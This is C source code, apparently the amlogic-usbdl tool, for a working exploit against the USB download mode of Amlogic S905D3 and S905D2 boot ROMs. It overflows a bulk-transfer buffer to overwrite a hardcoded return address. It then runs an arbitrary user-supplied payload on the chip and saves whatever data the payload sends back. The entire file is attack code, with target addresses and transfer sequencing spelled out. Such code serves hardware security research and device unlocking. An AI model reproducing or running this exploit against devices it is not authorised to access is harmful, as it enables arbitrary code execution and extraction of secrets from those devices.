/* amlogic-usbdl - github.com/frederic/amlogic-usbdl
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include "libusb-1.0/libusb.h"

#define DEBUG 1
#define VENDOR_ID 0x1b8e
#define PRODUCT_ID 0xc003
#define AM_REQ_WR_LARGE_MEM 0x11

#if DEBUG
#define dprint(args...) printf(args)
#else
#define dprint(args...)
#endif

static char *target_names[] = {
	"s905d3",
	"s905d2"
};

static uint32_t target_ra_ptrs[] = {
	0xfffe3688,//s905d3
	0xfffe3678 //s905d2
};

#define LOAD_ADDR 0xfffa0000
#define RUN_ADDR  LOAD_ADDR
#define BULK_TRANSFER_SIZE 0x100					  //alternative : 0x200, 0x1000
#define MAX_PAYLOAD_SIZE 0x10000 - BULK_TRANSFER_SIZE // we need the last transfer to overwrite return address

libusb_device_handle *handle = NULL;

typedef struct __attribute__((__packed__)) dldata_s
{
	uint32_t addr;
	uint32_t size;
	uint32_t unk0;
	uint32_t unk1;
	uint8_t data[];
} dldata_t;

static int save_received_data(const char *filename){
	FILE *fd;
	int transferred = 0;
	int total_transferred = 0;
	uint8_t buf[0x200];

	fd = fopen(filename,"wb");
	if (fd == NULL) {
		fprintf(stderr, "Error: Can't open output file!\n");
		return -1;
	}

	do {
		libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_IN | 1, buf, sizeof(buf), &transferred, 10);// no error handling because device-side is a mess anyway
		fwrite(buf, 1, transferred, fd);
		total_transferred += transferred;
	} while(transferred || (total_transferred == 0));

	fclose(fd);

	return total_transferred;
}

static int exploit(uint32_t ra_ptr, dldata_t *payload)
{
	int rc, transferred, i = 0;
	uint8_t bmRequestType, bRequest = 0;
	uint16_t wValue, wIndex, wLength = 0;
	uint32_t bulk_transfer_cnt = (ra_ptr - LOAD_ADDR) / BULK_TRANSFER_SIZE;
	uint32_t ram_size = ((ra_ptr - (LOAD_ADDR + (bulk_transfer_cnt * BULK_TRANSFER_SIZE))) / 4) + 1;
	uint32_t *ram = calloc(ram_size, sizeof(uint32_t));
	bmRequestType = 0x40;
	bRequest = AM_REQ_WR_LARGE_MEM;
	wValue = BULK_TRANSFER_SIZE;
	wIndex = bulk_transfer_cnt + 1; //one extra transfer to overwrite return address
	wLength = sizeof(dldata_t);

	payload->size += BULK_TRANSFER_SIZE; //extra transfer to overwrite return address...

	printf("- exploit: starting.\n");
	rc = libusb_control_transfer(handle, bmRequestType, bRequest, wValue, wIndex, (uint8_t *)payload, wLength, 0);
	if (rc != wLength)
	{
		printf("libusb_control_transfer : error %d\n", rc);
		fprintf(stderr, "Error libusb_control_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}

	payload->size -= BULK_TRANSFER_SIZE; //but we'll do it later

	printf("- exploit: sending payload...\n");
	uint8_t *payload_ptr = (uint8_t *)&payload->data;
	do
	{
		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, payload_ptr, (payload->size < wValue ? payload->size : wValue), &transferred, 0);
		if (rc)
		{
			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
			return rc;
		}
		payload_ptr += transferred;
		assert(payload->size >= transferred);
		payload->size -= transferred;
		wIndex--;
		dprint("libusb_bulk_transfer: transferred=%u, transfers left=%u\n", transferred, wIndex);
	} while (payload->size > 0 && wIndex);

	printf("- exploit: sending %u dummy transfers...\n", wIndex - 1);
	for (i = 0; i < wIndex - 1; i++)
	{
		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, 0, &transferred, 0);
		if (rc)
		{
			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
			return rc;
		}
		dprint("libusb_bulk_transfer[%u]: transferred=%d\n", i, transferred);
	}

	//overwrite return address with payload address
	ram[ram_size - 1] = RUN_ADDR;

	printf("- exploit: sending last transfer to overwrite RAM...\n");
	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)ram, (ram_size * sizeof(uint32_t)), &transferred, 0);
	free(ram);
	if (rc)
	{
		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}
	dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
	printf("- exploit: done.\n");

	return rc;
}

int main(int argc, char *argv[])
{
	libusb_context *ctx;
	FILE *fd;
	dldata_t *payload;
	uint8_t identity[6];
	size_t payload_size, fd_size;
	uint32_t target_ra_ptr = 0;
	int rc, i;

	if (!(argc == 3 || argc == 4))
	{
		printf("Usage: %s <target_name> <input_file> [<output_file>]\n", argv[0]);
		printf("\ttarget_name: ");
		for(i = 0; i < sizeof(target_names)/sizeof(target_names[0]); i++)
			printf("%s ", target_names[i]);
		printf("\n");
		printf("\tinput_file: payload binary to load and execute (max size %u bytes)\n", MAX_PAYLOAD_SIZE);
		printf("\toutput_file: file to write data returned by payload\n");
		return EXIT_SUCCESS;
	}

	for(i = 0; i < sizeof(target_names)/sizeof(target_names[0]); i++){
		if(!strcmp(target_names[i], (char *)argv[1])){
			printf("Target: %s\n", target_names[i]);
			target_ra_ptr = target_ra_ptrs[i];
		}
	}

	if (!target_ra_ptr)
	{
		fprintf(stderr, "Invalid target %s !\n", argv[1]);
		return EXIT_FAILURE;
	}

	fd = fopen(argv[2], "rb");
	if (fd == NULL)
	{
		fprintf(stderr, "Can't open input file %s !\n", argv[2]);
		return EXIT_FAILURE;
	}

	fseek(fd, 0, SEEK_END);
	fd_size = ftell(fd);

	if (fd_size > MAX_PAYLOAD_SIZE)
	{
		fprintf(stderr, "Error: input payload size cannot exceed %u bytes !\n", MAX_PAYLOAD_SIZE);
		return EXIT_FAILURE;
	}

	payload = (dldata_t *)calloc(1, sizeof(dldata_t) + MAX_PAYLOAD_SIZE);
	payload->addr = LOAD_ADDR;
	payload->size = MAX_PAYLOAD_SIZE;

	fseek(fd, 0, SEEK_SET);
	payload_size = fread(&payload->data, 1, fd_size, fd);
	if (payload_size != fd_size)
	{
		fprintf(stderr, "Error: cannot read entire file !\n");
		return EXIT_FAILURE;
	}

	rc = libusb_init(&ctx);
	if (rc < 0)
	{
		fprintf(stderr, "Error: failed to initialise libusb: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

	handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
	if (!handle)
	{
		fprintf(stderr, "Error: cannot open device %04x:%04x\n", VENDOR_ID, PRODUCT_ID);
		libusb_exit(NULL);
		return EXIT_FAILURE;
	}

	rc = libusb_claim_interface(handle, 0);
	if (rc)
	{
		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

	rc = libusb_control_transfer(handle, 0xc0, 0x20, 0, 0, identity, sizeof(identity), 0);
	if (rc != sizeof(identity))
	{
		fprintf(stderr, "Error: cannot execute identify command!\n");
		return EXIT_FAILURE;
	}

	if(identity[4])
	{
		fprintf(stderr, "Error: device is protected by password.\n");
		return EXIT_FAILURE;
	}
	else
	{
		exploit(target_ra_ptr, payload);
	}

	if(argc == 4){
		rc = save_received_data(argv[3]);
		if(rc > 0){
			printf("Received data saved to file %s (%u bytes).\n", argv[3], rc);
		}
	}

	libusb_release_interface(handle, 0);

	if (handle)
	{
		libusb_close(handle);
	}

	//libusb_exit(NULL);//double free on qubes os...

	return EXIT_SUCCESS;
}
